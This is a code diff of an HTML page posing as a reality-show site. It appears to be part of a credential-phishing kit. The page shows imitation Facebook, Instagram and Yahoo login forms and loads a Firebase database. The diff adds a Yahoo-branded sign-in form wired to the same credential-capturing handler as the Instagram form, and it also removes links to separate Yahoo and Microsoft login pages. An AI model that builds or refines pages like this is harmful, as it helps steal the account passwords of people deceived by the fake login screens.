@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="js/jquery-3.6.0.min.js"></script>
   <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="secured/yahoo/css/style.css">
   <script src="js/index.js"></script>
   <title>Arab 'n' Famous Reality Show</title>
 </head>
@@ -208,10 +209,9 @@
       </center>
       <center>
         <p>
-          <img id="yh" onclick="location.href='secured/yahoo/login.html';" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg">
-          <img id="hm" onclick="location.href='auth/microsoft/index.html';" src="auth/microsoft/img/microsoft_logo.svg">
           <img id="fb" onclick="fb()" src="image/fb.png">
           <img id="ig" onclick="ig()" src="image/ig.png">
+          <img id="yh" onclick="ig()" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg">
         </p>
         <br>
         <button onclick="can()" id="cancel">Close</button>
@@ -222,7 +222,7 @@
     <div id="fbp">
       <div class="facebook-login" id="fb2" align="center">
 
-        <div class="ggt">
+        <div class="fbt">
 
           <img src="image/fb.png" alt="logo" id="fblogo">
           <h1 id="fb2">
@@ -242,7 +242,7 @@
     <div id="igp">
       <div class="Instagram-login" id="ig2" align="center">
 
-        <div class="ppt">
+        <div class="igt">
 
           <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
           <br>
@@ -250,12 +250,47 @@
           <input type="password" placeholder="Password" id="ig-pass">
           <br>
           <button onclick="iglog()" id="ig-log">
-            log in
+            Log in
           </button>
         </div>
       </div>
     </div>
   </center>
+    <div id="igp">
+      <div class="igt">
+
+          <div id="divf">
+              <div id="f1">
+                  <div id="d4">
+                      <img id="image2" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg"
+                          height="95px" width="auto" alt="">
+                  </div>
+                  <h1 id="h1">Sign in</h1>
+                  <p id="p2">Sign in using your Yahoo account</p><br>
+                  <input required id="ig-uname" type="text" placeholder="Username, email address or mobile number">
+                  <hr id="hr1">
+                  <input required id="ig-pass" type="password" placeholder="Password">
+                  <hr id="hr1">
+                  <button onclick="iglog()" id="yh-log">Login</button>
+                  <br>
+                  <div>
+                      <button id="b2">
+                          <a id="acc" href="#">Create an account</a>
+                      </button>
+                  </div>
+                  <div>
+                      <p id="para">Or continue with</p>
+                  </div>
+                  <div>
+                      <a href="" id="p5">
+                          <button id="b3"> Hotmail<img id="image3"
+                                  src="../../auth/microsoft/img/microsoft_PNG18.png" alt="" height="32px">&nbsp;
+                          </button>
+                      </a>
+                  </div>
+              </div>
+          </div>
+    </div>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
